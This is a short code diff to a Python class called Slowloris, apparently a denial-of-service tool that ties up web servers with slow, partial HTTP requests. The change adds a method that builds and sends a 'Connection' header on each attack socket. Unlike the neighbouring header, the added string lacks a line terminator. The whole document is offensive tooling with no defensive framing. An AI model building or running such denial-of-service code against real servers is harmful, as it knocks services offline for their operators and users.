@@ -293,6 +293,7 @@ class Slowloris:
         s_socket.send(self.create_get_request_packet())
         s_socket.send(self.create_usr_agent_header())
         s_socket.send(self.create_accept_language_header())
+        s_socket.send(self.create_connection_header())
 
         return s_socket
         
@@ -316,6 +317,13 @@ class Slowloris:
         packet = f"Accept-language: {DefaultHttpParameters.Headers.accept_language}\r\n"
         return packet.encode("utf-8")
 
+    def create_connection_header(self) -> bytes:
+        """return the header for Connection"""
+        
+        packet = f"Connection: {DefaultHttpParameters.Headers.Connection}"
+        return packet.encode("utf-8")
+
+        
     def run(self):
         """Run"""
         
